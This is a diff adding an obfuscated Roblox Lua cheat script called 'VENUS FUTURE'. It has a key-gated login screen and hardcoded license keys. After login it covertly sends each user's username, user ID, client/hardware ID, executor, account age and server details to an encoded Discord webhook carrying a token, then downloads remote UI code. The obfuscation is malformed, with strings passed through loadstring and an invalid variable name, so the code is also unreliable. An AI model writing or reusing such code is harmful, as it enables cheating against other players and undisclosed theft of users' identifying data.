@@ -1,0 +1,1206 @@
+return(function(nEmIA, ...)
+local D2O3H7 = {"sPCo0YHhY";"KpEAcm1zDrN6";"M185i";"AZwgEnZ";"Qv2tyvOFh";"aLT7";"3I9WoOak";"9Th5V5KdNARMnN";"1LVenrowbYTKwShH";"RtOcj2Dr"}
+local Tn8LerXT = function(...)
+local Players            = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
+local RunService         = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
+local UserInputService   = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
+local HttpService        = game:GetService(loadstring(base64decode("SHR0cFNlcnZpY2U="))())
+local MarketplaceService = game:GetService(loadstring(base64decode("TWFya2V0cGxhY2VTZXJ2aWNl"))())
+local RbxAnalytics       = game:GetService(loadstring(base64decode("UmJ4QW5hbHl0aWNzU2VydmljZQ=="))())
+local TweenService       = game:GetService(loadstring(base64decode("VHdlZW5TZXJ2aWNl"))())
+local CoreGui            = game:GetService(loadstring(base64decode("Q29yZUd1aQ=="))())
+local W                  = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
+local L                  = game:GetService(loadstring(base64decode("TGlnaHRpbmc="))())
+local p                  = Players.LocalPlayer
+
+local CFG = {
+    TIKTOK       = loadstring(base64decode("aHR0cHM6Ly93d3cudGlrdG9rLmNvbS9OTyBBVkFJTEFCTEU="))(),
+    REACH        = 14,
+    BALL_SCAN    = 4.5,
+    BALL_KEYWORD = loadstring(base64decode("VFBT"))(),
+    WEBHOOK      = loadstring(base64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MzE4OTk2NTAwODAxOTQ5Ni9TTU5vczllbUdFa1ZyMXprLTBOc1FWR0ozZlpOV0oxVWc5SnZUREVZb2E3dDFjcnBqRnRXcm1DS240NmZLZ0dVd0M5Yw=="))(),
+    KEY_EXPIRY   = 90 * 86400,
+}
+
+local VALID_KEYS = {
+    [loadstring(base64decode("TElGRVRJTUUtNUZDMzQ1Q0g3"))()]  = {type=loadstring(base64decode("TElGRVRJTUU="))()},
+    [loadstring(base64decode("UFJFTUlVTS1LOVgyTTRQN1Ex"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1SM1M4VDVVNlYw"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1XMlg5WTRaMUE3"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1CNkMzRDhFNUYy"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1HN0gxSTRKOUsz"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1MNU0yTjhPNlA0"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1RMVI3UzNUOVU1"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1WNFc2WDJZOFoz"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1BOUI1QzFEN0U0"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1GM0c4SDJJNko3"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1LNEw5TTVOMU84"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1QMlE3UjNTNlQ5"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1VMVY1VzhYNFky"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1aNkEzQjlDNUQx"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1FOEY0RzdIMkk5"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1KNUsxTDZNM043"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1PNFA4UTJSOVM1"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1UM1U3VjFXNlg4"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1ZMlo5QTRCNUM4"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1EMUU2RjNHOUg3"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1JNUoySzhMNE02"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1OOU8zUDdRMVI0"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1TNlQ0VTlWMlc4"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1YN1kxWjVBOEIz"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+    [loadstring(base64decode("UFJFTUlVTS1DNEQ5RTJGNkc1"))()]  = {type=loadstring(base64decode("UFJFTUlVTQ=="))()},
+}
+
+local KEY_FILE = loadstring(base64decode("VmVudXNGdXR1cmUva2V5cy5qc29u"))()
+local keyValid = false
+local usedKeyData = nil
+
+local savedKeys = {}
+if isfile and isfile(KEY_FILE) then
+    local ok, data = pcall(function()
+        return HttpService:JSONDecode(readfile(KEY_FILE))
+    end)
+    if ok and type(data) == loadstring(base64decode("dGFibGU="))() then savedKeys = data end
+end
+
+local function saveKeys()
+    if writefile then
+        pcall(function()
+            if makefolder and not isfolder(loadstring(base64decode("VmVudXNGdXR1cmU="))()) then makefolder(loadstring(base64decode("VmVudXNGdXR1cmU="))()) end
+            writefile(KEY_FILE, HttpService:JSONEncode(savedKeys))
+        end)
+    end
+end
+
+local function validateKey(raw)
+    local key = raw:upper():gsub(loadstring(base64decode("JXMr"))(),loadstring(base64decode(""))())
+    local info = VALID_KEYS[key]
+    if not info then return false,loadstring(base64decode("SU5WQUxJRA=="))(),nil end
+    if info.type == loadstring(base64decode("TElGRVRJTUU="))() then return true,loadstring(base64decode("TElGRVRJTUU="))(),info end
+    local saved = savedKeys[key]
+    if saved then
+        if saved.usedBy and tostring(saved.usedBy) ~= tostring(p.UserId) then
+            return false,loadstring(base64decode("TEVBS0VE"))(),info end
+        if saved.usedAt and (os.time()-saved.usedAt) > CFG.KEY_EXPIRY then
+            return false,loadstring(base64decode("RVhQSVJFRA=="))(),info end
+        return true,loadstring(base64decode("QUxSRUFEWV9SRURFRU1FRA=="))(),info
+    end
+    savedKeys[key] = {usedBy=tostring(p.UserId), usedAt=os.time(), usedName=p.Name}
+    saveKeys()
+    return true,loadstring(base64decode("UFJFTUlVTV9ORVc="))(),info
+end
+
+do
+    local hui = (gethui and gethui()) or CoreGui
+    local old = hui:FindFirstChild(loadstring(base64decode("VmVudXNLZXlTY3JlZW4="))())
+    if old then old:Destroy() end
+    local sg = Instance.new(loadstring(base64decode("U2NyZWVuR3Vp"))())
+    sg.Name=loadstring(base64decode("VmVudXNLZXlTY3JlZW4="))(); sg.IgnoreGuiInset=true; sg.ResetOnSpawn=false
+    sg.DisplayOrder=99999; sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; sg.Parent=hui
+    local vp = W.CurrentCamera and W.CurrentCamera.ViewportSize or Vector2.new(800,600)
+    local overlay = Instance.new(loadstring(base64decode("RnJhbWU="))(),sg)
+    overlay.Size=UDim2.fromScale(1,1); overlay.BackgroundColor3=Color3.fromRGB(8,8,10)
+    overlay.BackgroundTransparency=0; overlay.BorderSizePixel=0
+    local cW = math.min(420,math.max(300,vp.X-60))
+    local card = Instance.new(loadstring(base64decode("RnJhbWU="))(),sg)
+    card.AnchorPoint=Vector2.new(.5,.5); card.Position=UDim2.new(.5,0,.6,0)
+    card.Size=UDim2.fromOffset(cW,230); card.BackgroundColor3=Color3.fromRGB(18,18,22)
+    card.BackgroundTransparency=1; card.BorderSizePixel=0
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),card).CornerRadius=UDim.new(0,20)
+    local cardGrad=Instance.new(loadstring(base64decode("VUlHcmFkaWVudA=="))(),card); cardGrad.Rotation=135
+    cardGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(24,24,30)),ColorSequenceKeypoint.new(1,Color3.fromRGB(14,14,18))})
+    local cardStroke=Instance.new(loadstring(base64decode("VUlTdHJva2U="))(),card)
+    cardStroke.Color=Color3.fromRGB(55,55,70); cardStroke.Thickness=1
+    local accLine=Instance.new(loadstring(base64decode("RnJhbWU="))(),card)
+    accLine.Size=UDim2.new(0.6,0,0,2); accLine.Position=UDim2.new(0.2,0,0,0)
+    accLine.BackgroundColor3=Color3.fromRGB(200,200,220); accLine.BorderSizePixel=0
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),accLine).CornerRadius=UDim.new(1,0)
+    local accGrad=Instance.new(loadstring(base64decode("VUlHcmFkaWVudA=="))(),accLine)
+    accGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(40,40,55)),ColorSequenceKeypoint.new(0.5,Color3.fromRGB(220,220,240)),ColorSequenceKeypoint.new(1,Color3.fromRGB(40,40,55))})
+    local titleLbl=Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(),card)
+    titleLbl.Position=UDim2.fromOffset(0,22); titleLbl.Size=UDim2.new(1,0,0,30)
+    titleLbl.BackgroundTransparency=1; titleLbl.Font=Enum.Font.GothamBold
+    titleLbl.TextSize=22; titleLbl.TextColor3=Color3.fromRGB(240,240,248)
+    titleLbl.Text=loadstring(base64decode("VkVOVVMgRlVUVVJF"))(); titleLbl.TextXAlignment=Enum.TextXAlignment.Center
+    local tGrad=Instance.new(loadstring(base64decode("VUlHcmFkaWVudA=="))(),titleLbl); tGrad.Rotation=12
+    tGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(148,148,164)),ColorSequenceKeypoint.new(0.45,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(0.55,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(148,148,164))})
+    tGrad.Offset=Vector2.new(-0.55,0)
+    TweenService:Create(tGrad,TweenInfo.new(2.6,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Offset=Vector2.new(0.55,0)}):Play()
+    local subLbl=Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(),card)
+    subLbl.Position=UDim2.fromOffset(0,56); subLbl.Size=UDim2.new(1,0,0,18)
+    subLbl.BackgroundTransparency=1; subLbl.Font=Enum.Font.Gotham; subLbl.TextSize=13
+    subLbl.TextColor3=Color3.fromRGB(90,90,115); subLbl.Text=loadstring(base64decode("RW50ZXIgeW91ciBrZXkgdG8gY29udGludWU="))()
+    subLbl.TextXAlignment=Enum.TextXAlignment.Center
+    local boxC=Instance.new(loadstring(base64decode("RnJhbWU="))(),card)
+    boxC.Position=UDim2.new(0,20,0,86); boxC.Size=UDim2.new(1,-40,0,44)
+    boxC.BackgroundColor3=Color3.fromRGB(26,26,34); boxC.BorderSizePixel=0
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),boxC).CornerRadius=UDim.new(0,10)
+    Instance.new(loadstring(base64decode("VUlTdHJva2U="))(),boxC).Color=Color3.fromRGB(50,50,68)
+    local tb=Instance.new(loadstring(base64decode("VGV4dEJveA=="))(),boxC)
+    tb.Size=UDim2.new(1,-20,1,0); tb.Position=UDim2.fromOffset(10,0)
+    tb.BackgroundTransparency=1; tb.Font=Enum.Font.GothamMedium; tb.TextSize=14
+    tb.TextColor3=Color3.fromRGB(215,215,232); tb.PlaceholderColor3=Color3.fromRGB(70,70,92)
+    tb.PlaceholderText=loadstring(base64decode("UFJFTUlVTS1YWFhYWFhYWFhYICAvICBMSUZFVElNRS1YWFhYWFhYWFg="))()
+    tb.Text=loadstring(base64decode(""))(); tb.ClearTextOnFocus=false; tb.TextXAlignment=Enum.TextXAlignment.Left
+    local btn=Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(),card)
+    btn.Position=UDim2.new(0,20,0,144); btn.Size=UDim2.new(1,-40,0,42)
+    btn.BackgroundColor3=Color3.fromRGB(36,36,48); btn.BorderSizePixel=0
+    btn.Font=Enum.Font.GothamBold; btn.TextSize=15
+    btn.TextColor3=Color3.fromRGB(210,210,230); btn.Text=loadstring(base64decode("VmVyaWZ5IEtleQ=="))(); btn.AutoButtonColor=false
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),btn).CornerRadius=UDim.new(0,10)
+    Instance.new(loadstring(base64decode("VUlTdHJva2U="))(),btn).Color=Color3.fromRGB(70,70,92)
+    local statusLbl=Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(),card)
+    statusLbl.Position=UDim2.new(0,20,0,194); statusLbl.Size=UDim2.new(1,-40,0,20)
+    statusLbl.BackgroundTransparency=1; statusLbl.Font=Enum.Font.Gotham; statusLbl.TextSize=12
+    statusLbl.TextColor3=Color3.fromRGB(90,90,115); statusLbl.Text=loadstring(base64decode(""))()
+    statusLbl.TextXAlignment=Enum.TextXAlignment.Center
+    local function setStatus(msg,col) statusLbl.Text=msg; statusLbl.TextColor3=col or Color3.fromRGB(90,90,115) end
+    local function shakeCard()
+        local orig=card.Position
+        for 0kXyE4xk=1,4 do
+            TweenService:Create(card,TweenInfo.new(0.05),{Position=UDim2.new(orig.X.Scale,orig.X.Offset+(0kXyE4xk%2==0 and 9 or -9),orig.Y.Scale,orig.Y.Offset)}):Play()
+            task.wait(0.055)
+        end
+        TweenService:Create(card,TweenInfo.new(0.08),{Position=orig}):Play()
+    end
+    local function onSubmit()
+        local key=tb.Text:upper():gsub(loadstring(base64decode("JXMr"))(),loadstring(base64decode(""))())
+        if #key<5 then setStatus(loadstring(base64decode("4pqgICBFbnRlciBhIHZhbGlkIGtleQ=="))(),Color3.fromRGB(220,130,60)); shakeCard(); return end
+        setStatus(loadstring(base64decode("VmVyaWZ5aW5nLi4u"))(),Color3.fromRGB(140,140,180))
+        local ok,reason,info=validateKey(key)
+        if ok then
+            local lbl=(info and info.type==loadstring(base64decode("TElGRVRJTUU="))()) and loadstring(base64decode("4pymIEZvdW5kZXI="))() or loadstring(base64decode("4pymIFByZW1pdW0="))()
+            setStatus(lbl..loadstring(base64decode("IOKAlCBBY2Nlc3MgZ3JhbnRlZA=="))(),Color3.fromRGB(140,210,150))
+            TweenService:Create(cardStroke,TweenInfo.new(0.3),{Color=Color3.fromRGB(90,190,110)}):Play()
+            task.delay(0.65,function()
+                TweenService:Create(overlay,TweenInfo.new(0.4,Enum.EasingStyle.Quad),{BackgroundTransparency=1}):Play()
+                TweenService:Create(card,TweenInfo.new(0.4,Enum.EasingStyle.Quad),{BackgroundTransparency=1}):Play()
+                task.delay(0.45,function()
+                    pcall(function() sg:Destroy() end)
+                    usedKeyData={key=key,type=(info and info.type or loadstring(base64decode("VU5LTk9XTg=="))()),reason=reason}
+                    keyValid=true
+                end)
+            end)
+        else
+            if reason==loadstring(base64decode("TEVBS0VE"))() then setStatus(loadstring(base64decode("4pyXIExlYWtlZCBrZXkg4oCUIGFscmVhZHkgdXNlZCBieSBhbm90aGVyIHVzZXI="))(),Color3.fromRGB(220,70,70))
+            elseif reason==loadstring(base64decode("RVhQSVJFRA=="))() then setStatus(loadstring(base64decode("4pyXIEV4cGlyZWQga2V5ICg5MC1kYXkgbGltaXQp"))(),Color3.fromRGB(220,70,70))
+            else setStatus(loadstring(base64decode("4pyXIEludmFsaWQga2V5"))(),Color3.fromRGB(220,70,70)) end
+            TweenService:Create(cardStroke,TweenInfo.new(0.2),{Color=Color3.fromRGB(200,55,55)}):Play()
+            task.delay(1.6,function() TweenService:Create(cardStroke,TweenInfo.new(0.4),{Color=Color3.fromRGB(55,55,70)}):Play() end)
+            shakeCard()
+        end
+    end
+    btn.MouseButton1Click:Connect(onSubmit)
+    tb.FocusLost:Connect(function(enter) if enter then onSubmit() end end)
+    btn.MouseEnter:Connect(function() TweenService:Create(btn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(48,48,62)}):Play() end)
+    btn.MouseLeave:Connect(function() TweenService:Create(btn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(36,36,48)}):Play() end)
+    TweenService:Create(card,TweenInfo.new(0.45,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Position=UDim2.new(0.5,0,0.5,0),BackgroundTransparency=0}):Play()
+end
+
+repeat task.wait(0.05) until keyValid
+
+task.spawn(function()
+    pcall(function()
+        local userId=p.UserId
+        local thumbUrl
+        pcall(function()
+            thumbUrl=HttpService:JSONDecode(game:HttpGet(
+                loadstring(base64decode("aHR0cHM6Ly90aHVtYm5haWxzLnJvYmxveC5jb20vdjEvdXNlcnMvYXZhdGFyLWhlYWRzaG90P3VzZXJJZHM9"))()..userId..loadstring(base64decode("JnNpemU9NDIweDQyMCZmb3JtYXQ9UG5nJmlzQ2lyY3VsYXI9ZmFsc2U="))()
+            )).data[1].imageUrl
+        end)
+        local executor=(identifyexecutor and identifyexecutor()) or loadstring(base64decode("VW5rbm93bg=="))()
+        local hwid=loadstring(base64decode("Ti9B"))(); pcall(function() hwid=RbxAnalytics:GetClientId() end)
+        local gameName=tostring(game.PlaceId)
+        pcall(function() gameName=MarketplaceService:GetProductInfo(game.PlaceId).Name end)
+        local isFounder=usedKeyData and usedKeyData.type==loadstring(base64decode("TElGRVRJTUU="))()
+        local isLeaked=usedKeyData and usedKeyData.reason==loadstring(base64decode("TEVBS0VE"))()
+        local embedColor=isFounder and 0xFFD700 or 0x9B59B6
+        local keyTypeStr=isFounder and loadstring(base64decode("8J+RkSBMSUZFVElNRSDigJQgRm91bmRlcg=="))() or loadstring(base64decode("8J+SjiBQUkVNSVVN"))()
+        local keyStr=usedKeyData and usedKeyData.key or loadstring(base64decode("VW5rbm93bg=="))()
+        local leakAlert=isLeaked and loadstring(base64decode("XG7wn5qoICoqQUxFUlQ6IExFQUtFRCBLRVkqKg=="))() or loadstring(base64decode(""))()
+        local payload=HttpService:JSONEncode({
+            content=loadstring(base64decode("KipWRU5VUyBGVVRVUkUg4oCUIFNjcmlwdCBFeGVjdXRlZCoq"))()..leakAlert,
+            embeds={{
+                title=loadstring(base64decode("8J+agCBFeGVjdXRpb24gwrcgVkVOVVMgRlVUVVJF"))(), color=embedColor,
+                thumbnail=thumbUrl and {url=thumbUrl} or nil,
+                fields={
+                    {name=loadstring(base64decode("8J+TiyBTY3JpcHQ="))(),    value=loadstring(base64decode("VkVOVVMgRlVUVVJFIHYxLjA="))(),inline=true},
+                    {name=loadstring(base64decode("8J+Pt++4jyBLZXkgVHlwZQ=="))(),  value=keyTypeStr,inline=true},
+                    {name=loadstring(base64decode("8J+UkSBLZXkgdXNlZA=="))(),  value=loadstring(base64decode("YA=="))()..keyStr..loadstring(base64decode("YA=="))(),inline=false},
+                    {name=loadstring(base64decode("8J+RpCBQbGF5ZXI="))(),    value=p.Name..loadstring(base64decode("ICg="))()..p.DisplayName..loadstring(base64decode("KVxuSUQ6IA=="))()..userId..loadstring(base64decode("XG5IV0lEOiA="))()..hwid..loadstring(base64decode("XG5FeGVjdXRvcjog"))()..executor,inline=false},
+                    {name=loadstring(base64decode("8J+ThSBBY2NvdW50"))(),   value=loadstring(base64decode("QWdlOiA="))()..p.AccountAge..loadstring(base64decode("IGRheXNcbkNyZWF0ZWQ6IA=="))()..os.date(loadstring(base64decode("JVktJW0tJWQ="))(),os.time()-p.AccountAge*86400),inline=false},
+                    {name=loadstring(base64decode("8J+OriBHYW1l"))(),      value=gameName..loadstring(base64decode("XG5JRDog"))()..game.PlaceId..loadstring(base64decode("XG5Kb2I6IA=="))()..game.JobId,inline=false},
+                    {name=loadstring(base64decode("8J+Wpe+4jyBTZXJ2ZXI="))(),    value=loadstring(base64decode("UGxheWVyczog"))()..#Players:GetPlayers()..loadstring(base64decode("Lw=="))()..Players.MaxPlayers,inline=false},
+                },
+                footer={text=isFounder and loadstring(base64decode("8J+MnyBGb3VuZGVyIEFjY2VzcyDigJQgVkVOVVMgRlVUVVJF"))() or loadstring(base64decode("8J+SqyBQcmVtaXVtIEFjY2VzcyDigJQgVkVOVVMgRlVUVVJF"))()},
+            }},
+        })
+        local req=http_request or request or (syn and syn.request)
+        if req then req({Url=CFG.WEBHOOK,Method=loadstring(base64decode("UE9TVA=="))(),Headers={[loadstring(base64decode("Q29udGVudC1UeXBl"))()]=loadstring(base64decode("YXBwbGljYXRpb24vanNvbg=="))()},Body=payload}) end
+    end)
+end)
+
+LOADUI={}
+do
+    local TS=TweenService
+    local hui=(gethui and gethui()) or CoreGui
+    local old=hui:FindFirstChild(loadstring(base64decode("VmVudXNMb2FkaW5n"))()); if old then old:Destroy() end
+    local sg=Instance.new(loadstring(base64decode("U2NyZWVuR3Vp"))())
+    sg.Name=loadstring(base64decode("VmVudXNMb2FkaW5n"))(); sg.IgnoreGuiInset=true; sg.ResetOnSpawn=false
+    sg.DisplayOrder=99998; sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; sg.Parent=hui
+    local vp=W.CurrentCamera and W.CurrentCamera.ViewportSize or Vector2.new(800,600)
+    local bg=Instance.new(loadstring(base64decode("RnJhbWU="))(),sg)
+    bg.Size=UDim2.fromScale(1,1); bg.BackgroundColor3=Color3.new(0,0,0)
+    bg.BackgroundTransparency=1; bg.BorderSizePixel=0
+    local card=Instance.new(loadstring(base64decode("RnJhbWU="))(),sg)
+    card.AnchorPoint=Vector2.new(.5,.5); card.Position=UDim2.fromScale(.5,.5)
+    card.Size=UDim2.fromOffset(math.min(360,math.max(280,vp.X-40)),102)
+    card.BackgroundColor3=Color3.fromRGB(23,23,28); card.BackgroundTransparency=1; card.BorderSizePixel=0
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),card).CornerRadius=UDim.new(0,18)
+    local cg=Instance.new(loadstring(base64decode("VUlHcmFkaWVudA=="))(),card); cg.Rotation=90
+    cg.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(30,30,36)),ColorSequenceKeypoint.new(1,Color3.fromRGB(16,16,20))})
+    local cstroke=Instance.new(loadstring(base64decode("VUlTdHJva2U="))(),card)
+    cstroke.Color=Color3.fromRGB(140,140,165); cstroke.Thickness=1; cstroke.Transparency=1
+    local iconBox=Instance.new(loadstring(base64decode("RnJhbWU="))(),card)
+    iconBox.Position=UDim2.fromOffset(22,18); iconBox.Size=UDim2.fromOffset(44,44)
+    iconBox.BackgroundColor3=Color3.fromRGB(38,38,47); iconBox.BackgroundTransparency=1; iconBox.BorderSizePixel=0
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),iconBox).CornerRadius=UDim.new(1,0)
+    local ib2=Instance.new(loadstring(base64decode("VUlTdHJva2U="))(),iconBox)
+    ib2.Color=Color3.fromRGB(140,140,165); ib2.Thickness=1; ib2.Transparency=1
+    local iconImg=Instance.new(loadstring(base64decode("SW1hZ2VMYWJlbA=="))(),iconBox)
+    iconImg.AnchorPoint=Vector2.new(.5,.5); iconImg.Position=UDim2.fromScale(.5,.5)
+    iconImg.Size=UDim2.fromOffset(23,23); iconImg.BackgroundTransparency=1
+    iconImg.Image=loadstring(base64decode("cmJ4YXNzZXRpZDovLzExMDkyNjExODM5MTk4Nw=="))()
+    iconImg.ImageColor3=Color3.fromRGB(236,236,244); iconImg.ImageTransparency=1
+    local titleL=Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(),card)
+    titleL.Position=UDim2.fromOffset(81,20); titleL.Size=UDim2.new(1,-103,0,22)
+    titleL.BackgroundTransparency=1; titleL.Font=Enum.Font.GothamBold; titleL.TextSize=19
+    titleL.TextXAlignment=Enum.TextXAlignment.Left
+    titleL.TextColor3=Color3.fromRGB(242,242,248); titleL.TextTransparency=1; titleL.Text=loadstring(base64decode("VkVOVVMgRlVUVVJF"))()
+    local subL=Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(),card)
+    subL.Position=UDim2.fromOffset(81,43); subL.Size=UDim2.new(1,-103,0,19)
+    subL.BackgroundTransparency=1; subL.Font=Enum.Font.Gotham; subL.TextSize=16
+    subL.TextXAlignment=Enum.TextXAlignment.Left
+    subL.TextColor3=Color3.fromRGB(139,139,153); subL.TextTransparency=1; subL.Text=loadstring(base64decode("TG9hZGluZy4uLg=="))()
+    local track=Instance.new(loadstring(base64decode("RnJhbWU="))(),card)
+    track.Position=UDim2.fromOffset(22,79); track.Size=UDim2.new(1,-44,0,5)
+    track.BackgroundColor3=Color3.fromRGB(38,38,47); track.BackgroundTransparency=1; track.BorderSizePixel=0
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),track).CornerRadius=UDim.new(1,0)
+    local fill=Instance.new(loadstring(base64decode("RnJhbWU="))(),track)
+    fill.Size=UDim2.new(0,0,1,0); fill.BackgroundTransparency=1
+    fill.BackgroundColor3=Color3.fromRGB(255,255,255); fill.BorderSizePixel=0
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),fill).CornerRadius=UDim.new(1,0)
+    Instance.new(loadstring(base64decode("VUlHcmFkaWVudA=="))(),fill).Color=ColorSequence.new(Color3.fromRGB(143,143,158),Color3.fromRGB(255,255,255))
+    local ti=TweenInfo.new(.2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
+    TS:Create(bg,ti,{BackgroundTransparency=.5}):Play(); TS:Create(card,ti,{BackgroundTransparency=0}):Play()
+    TS:Create(cstroke,ti,{Transparency=.58}):Play(); TS:Create(iconBox,ti,{BackgroundTransparency=0}):Play()
+    TS:Create(ib2,ti,{Transparency=.5}):Play(); TS:Create(iconImg,ti,{ImageTransparency=0}):Play()
+    TS:Create(titleL,ti,{TextTransparency=0}):Play(); TS:Create(subL,ti,{TextTransparency=0}):Play()
+    TS:Create(track,ti,{BackgroundTransparency=0}):Play(); TS:Create(fill,ti,{BackgroundTransparency=0}):Play()
+    local progress=0
+    LOADUI.step=function(pct,msg)
+        pct=math.clamp(pct,0,1)
+        if pct>progress then progress=pct
+            TS:Create(fill,TweenInfo.new(.35,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{Size=UDim2.new(pct,0,1,0)}):Play()
+        end
+        if msg then subL.Text=tostring(msg) end
+    end
+    LOADUI.done=function()
+        progress=1; subL.Text=loadstring(base64decode("UmVhZHkh"))()
+        TS:Create(fill,TweenInfo.new(.25,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{Size=UDim2.new(1,0,1,0)}):Play()
+        task.delay(.4,function()
+            local ti2=TweenInfo.new(.26,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
+            for _,o in ipairs({bg,card,cstroke,iconBox,ib2,iconImg,titleL,subL,track,fill}) do
+                local prop=o:IsA(loadstring(base64decode("VUlTdHJva2U="))()) and loadstring(base64decode("VHJhbnNwYXJlbmN5"))() or (o:IsA(loadstring(base64decode("SW1hZ2VMYWJlbA=="))()) and loadstring(base64decode("SW1hZ2VUcmFuc3BhcmVuY3k="))()) or (o:IsA(loadstring(base64decode("VGV4dExhYmVs"))()) and loadstring(base64decode("VGV4dFRyYW5zcGFyZW5jeQ=="))()) or loadstring(base64decode("QmFja2dyb3VuZFRyYW5zcGFyZW5jeQ=="))()
+                pcall(function() TS:Create(o,ti2,{[prop]=1}):Play() end)
+            end
+            task.delay(.3,function() pcall(function() sg:Destroy() end) end)
+        end)
+    end
+    task.delay(30,function() LOADUI.done() end)
+end
+
+LOADUI.step(.05,loadstring(base64decode("TG9hZGluZyBXaW5kVUkuLi4="))())
+
+local lib
+do
+    local src
+    if isfile and readfile and isfile(loadstring(base64decode("VmVudXNGdXR1cmUvd2luZHVpLmx1YQ=="))()) then
+        local ok,r=pcall(readfile,loadstring(base64decode("VmVudXNGdXR1cmUvd2luZHVpLmx1YQ=="))())
+        if ok and type(r)==loadstring(base64decode("c3RyaW5n"))() and #r>100000 then src=r end
+    end
+    local fresh=src==nil
+    src=src or game:HttpGet(loadstring(base64decode("aHR0cHM6Ly9naXRodWIuY29tL0Zvb3RhZ2VzdXMvV2luZFVJL3JlbGVhc2VzL2xhdGVzdC9kb3dubG9hZC9tYWluLmx1YQ=="))())
+    if fresh and writefile then
+        pcall(function()
+            if makefolder and isfolder and not isfolder(loadstring(base64decode("VmVudXNGdXR1cmU="))()) then makefolder(loadstring(base64decode("VmVudXNGdXR1cmU="))()) end
+            writefile(loadstring(base64decode("VmVudXNGdXR1cmUvd2luZHVpLmx1YQ=="))(),src)
+        end)
+    end
+    if writefile and isfile and not isfile(loadstring(base64decode("VmVudXNGdXR1cmUvaWNvbnMtbWFpbi5sdWE="))()) then
+        pcall(function()
+            local str,n=game:HttpGet(loadstring(base64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Zvb3RhZ2VzdXMvSWNvbnMvbWFpbi9NYWluLXYyLmx1YQ=="))()):gsub(
